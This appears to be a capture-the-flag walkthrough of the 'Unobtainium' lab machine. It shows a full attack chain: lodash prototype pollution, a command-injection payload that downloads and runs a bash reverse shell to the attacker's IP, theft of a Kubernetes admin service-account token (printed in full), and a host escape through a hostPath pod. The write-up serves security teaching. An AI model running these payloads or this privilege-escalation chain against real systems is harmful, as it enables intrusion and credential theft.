![Unobtainium](banner.png)

```
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))
2379/tcp  open  ssl/etcd-client?
2380/tcp  open  ssl/etcd-server?
8443/tcp  open  ssl/https-alt
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
31337/tcp open  http             Node.js Express framework
```
## Foothold

![website.png](website.png)

First we download the package according to our system. For us it's the .deb since we are on kali. We continue to extract the package and run the `unobtainium` application in `/opt/unobtainium` after making it executable with `chmod +x unobtainium`.

Now we have a look at the app:

![app.png](app.png)

We have a meaningless chart, can send messages, have a look at the messages log and can read a todo file.

We use wireshark to have a closer look on the communication of the app. Especially reading the todo file seems interesting:

![wireshark_todo.png](wireshark_todo.png)

The package looks like this:
```
HTTP/1.1

Host: unobtainium.htb:31337

Connection: keep-alive

Content-Length: 73

Accept: application/json, text/javascript, */*; q=0.01

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36

Content-Type: application/json

Accept-Encoding: gzip, deflate

Accept-Language: en-US



{"auth":{"name":"felamos","password":"Winter2021"},"filename":"todo.txt"}
```

We can use postman or the REST plugin for firefox or burpsuite to recreate this package and send it manually. We can change the filename to read other files in the same directory as the todo.txt. We use this to retrieve the index.js by changing the body to this:

```
{"auth":{"name":"felamos","password":"Winter2021"},"filename":"index.js"}
```

index.js
```js
var root = require("google-cloudstorage-commands");
const express = require('express');
const { exec } = require("child_process");
const bodyParser = require('body-parser'); 
const _ = require('lodash'); 
const app = express();
var fs = require('fs');
 
const users = [ 
 {name: 'felamos', password: 'Winter2021'},
 {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true}, 
];

let messages = []; 
let lastId = 1; 
 
function findUser(auth) { 
 return users.find((u) => 
 u.name === auth.name && 
 u.password === auth.password); 
} 
 
app.use(bodyParser.json()); 
 
app.get('/', (req, res) => { 
 res.send(messages); 
}); 
 
app.put('/', (req, res) => { 
 const user = findUser(req.body.auth || {}); 
 
 if (!user) { 
 res.status(403).send({ok: false, error: 'Access denied'}); 
 return;
 }

 const message = {
 icon: '__',
 };

 _.merge(message, req.body.message, {
 id: lastId++,
 timestamp: Date.now(),
 userName: user.name,
 });

 messages.push(message);
 res.send({ok: true});
});

app.delete('/', (req, res) => {
 const user = findUser(req.body.auth || {});

 if (!user || !user.canDelete) {
 res.status(403).send({ok: false, error: 'Access denied'});
 return;
 }

 messages = messages.filter((m) => m.id !== req.body.messageId);
 res.send({ok: true});
});
app.post('/upload', (req, res) => {
 const user = findUser(req.body.auth || {});
 if (!user || !user.canUpload) {
 res.status(403).send({ok: false, error: 'Access denied'});
 return;
 }


 filename = req.body.filename;
 root.upload("./",filename, true);
 res.send({ok: true, Uploaded_File: filename});
});

app.post('/todo', (req, res) => {
const user = findUser(req.body.auth || {});
if (!user) {
res.status(403).send({ok: false, error: 'Access denied'});
return;
}

filename = req.body.filename;
 testFolder = "/usr/src/app";
 fs.readdirSync(testFolder).forEach(file => {
 if (file.indexOf(filename) > -1) {
 var buffer = fs.readFileSync(filename).toString();
 res.send({ok: true, content: buffer});
 }
 });
});

app.listen(3000);
console.log('Listening on port 3000...');
```

Now we have a good understanding of what the app does. Interestingly we could upload files if we were the admin user, however the admin password is randomly generated. We could also upload if the `felamos` user had the `canUpload` parameter set to `true`. 

## User

At this point we started to search on google for vulnerabilites that would help us and found out about [prototype pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution). So we investigated further and found out that there is exactly [this vulerability](https://github.com/kimmobrunfeldt/lodash-merge-pollution-example) in older lodash versions.

In the index.js we can see inside the `app.put` function that our messages get merged via lodash. So we craft a payload like this to pollute the prototype that `canUpload` is `true` for every object:

![canupload.png](canupload.png)

```
{"auth":{"name":"felamos","password":"Winter2021"},"message":{"__proto__":{"canUpload":true}}}
```

Now we can make use of the `app.upload` function as user `felamos` aswell. After looking for google-cloud-storage upload vulnerabilities we quickly found [this PoC](https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431) which shows our exact scenario. We confirm this by trying to pull a file from our host system like this:

```
{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& wget http://10.10.14.53:1234/test"}
```

After seeing the request on our local http server we know that we have code execution.

![http_log.png](http_log.png)

So we can create a `rev.sh` with a reverse shell like this:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.53/4242 0>&1
```

And execute it by sending this payload:

```
{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& wget http://10.10.14.53:1234/rev.sh & chmod +x rev.sh & /bin/bash rev.sh"}
```

## Root

After running [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) the first thing we noticed was that there is a cronjob that keeps on deleting a file named `kubectl` every minute everywhere on the system. 

So we transfer kubectl on the system but rename it to just `kube` and make it executable.
We can now use kubectl to enumerate the container:
```
./kube get namespaces    
NAME              STATUS   AGE
default           Active   221d
dev               Active   221d
kube-node-lease   Active   221d
kube-public       Active   221d
kube-system       Active   221d
```

We see that there are a couple of other namespaces.
With `./kube auth can-i --list` we can list our pivileges but we don't have any interesting privileges in the `default` namespace and neither in the `dev` namespace:

![can_i_dev.png](can_i_dev.png) 

Having a closer look at the `dev` namespace we can see that there are a couple of `pods` running:

```
./kube get pods -n dev    
NAME                                READY   STATUS    RESTARTS   AGE
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   31         221d
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   32         221d
devnode-deployment-cd86fb5c-qlxww   1/1     Running   32         221d
```

Let's have a closer look at these:

```
./kube describe pod/devnode-deployment-cd86fb5c-6ms8d -n dev

Name:         devnode-deployment-cd86fb5c-6ms8d
Namespace:    dev
Priority:     0
Node:         unobtainium/10.129.194.26
Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  <none>
Status:       Running
IP:           172.17.0.4
IPs:
  IP:           172.17.0.4
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:
  devnode:
    Container ID:   docker://2d97a59ee8af743bfe4d1d7a383542924ff8dcad8cd962d266b473032ac7055a
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Thu, 26 Aug 2021 15:08:06 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Mon, 26 Jul 2021 15:32:24 +0000
      Finished:     Mon, 26 Jul 2021 15:33:59 +0000
    Ready:          True
    Restart Count:  31
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             True 
  ContainersReady   True 
  PodScheduled      True 
Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          <none>
```
It looke like there is a devlopement environment running with the same app we just exploited on `172.17.0.4:3000`. 

We simply export our payloads from postman to curl and reproduce our attack:

```
curl --location --request PUT 'http://172.17.0.4:3000/' \
--header 'Content-Type: application/json' \
--data-raw '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"__proto__":{"canUpload":true}}}'
```

Just change the port in our `rev.sh` and continue:

```
curl --location --request POST 'http://172.17.0.6:3000/upload' \
--header 'Content-Type: application/json' \
--data-raw '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& wget http://10.10.14.53:1234/rev.sh & chmod +x rev.sh & /bin/bash rev.sh"}'
```

Let's check our priliges in our new `pod` after copying kubectl on it aswell:

```
./kube auth can-i --list -n kube-system
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
```

Sweet, we can get and list the secrets:

```
./kube get secrets -n kube-system
NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      221d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      221d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      221d
[...]
```

The admin token looks promising to let's extract that:

```
./kube describe secret/c-admin-token-tfmp2 -n kube-system

Name:         c-admin-token-tfmp2
Namespace:    kube-system
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: c-admin
              kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0

Type:  kubernetes.io/service-account-token

Data
====
ca.crt:     1066 bytes
namespace:  11 bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
```

For convience we safe the token in a variable: `export admin_token='{TOKEN_HERE}'`.

Let's check our privileges with the admin token:

```
./kube --token=$admin_token auth can-i --list

Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
```

Nice, we can do everything, which means we can create pods aswell. We can abuse it like [this](https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#escaping-from-the-pod).

First we create an `attacker.yaml` using an already known image name and a policy of `IfNotPresent`. We saw that by looking at other pods in default with: `./kube --token=$admin_token get pod webapp-deployment-5d764566f4-h5zhw -n default -o yaml`.


attacker.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: attacker-pod
  name: attacker-pod
  namespace: default
spec:
  volumes:
  - name: host-fs
    hostPath:
      path: /
  containers:
  - image: node_server:latest
    imagePullPolicy: IfNotPresent
    name: attacker-pod
    volumeMounts:
      - name: host-fs
        mountPath: /root
  restartPolicy: Never
```

Let's create the new attacker-pod:
```
./kube --token=$admin_token create -f attacker.yaml -n default
```

And interact with it like this:

```
./kube --token=$admin_token exec -it attacker-pod -n default -- bash
```
Now just run `chroot /root /bin/bash` to become root.
